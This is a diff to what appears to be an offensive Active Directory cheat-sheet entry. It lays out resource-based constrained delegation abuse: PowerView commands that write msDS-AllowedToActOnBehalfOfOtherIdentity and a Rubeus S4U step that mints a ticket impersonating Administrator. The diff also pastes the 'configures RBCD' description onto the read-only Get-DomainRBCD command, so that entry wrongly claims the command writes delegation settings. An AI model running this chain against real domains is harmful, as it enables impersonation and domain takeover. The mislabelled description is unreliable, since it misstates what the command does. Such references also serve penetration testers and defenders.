@@ -215,11 +215,13 @@
   "variations": [
     {
       "label": "Set RBCD with PowerView",
-      "command": "Set-DomainRBCD -Identity <target_computer> -DelegateFrom '<attacker_computer>$' -Verbose"
+      "command": "Set-DomainRBCD -Identity <target_computer> -DelegateFrom '<attacker_computer>$' -Verbose",
+      "description": "Configures Resource-Based Constrained Delegation (RBCD) on a target computer. Writes to msDS-AllowedToActOnBehalfOfOtherIdentity so a controlled account can impersonate any user to services on the target."
     },
     {
       "label": "Read back RBCD config",
-      "command": "Get-DomainRBCD"
+      "command": "Get-DomainRBCD",
+      "description": "Configures Resource-Based Constrained Delegation (RBCD) on a target computer. Writes to msDS-AllowedToActOnBehalfOfOtherIdentity so a controlled account can impersonate any user to services on the target."
     }
   ],
   "explain": "Writes msDS-AllowedToActOnBehalfOfOtherIdentity on a computer you can write to, setting up RBCD:\n  Set-ADComputer -Identity <target_computer>   the victim computer object\n  -PrincipalsAllowedToDelegateToAccount <attacker_computer>$   the machine account allowed to impersonate to it\nRequires GenericWrite/WriteDACL on the target. Then Rubeus s4u (S4U2Self+S4U2Proxy) as <attacker_computer>$ mints a service ticket to the target impersonating Administrator."
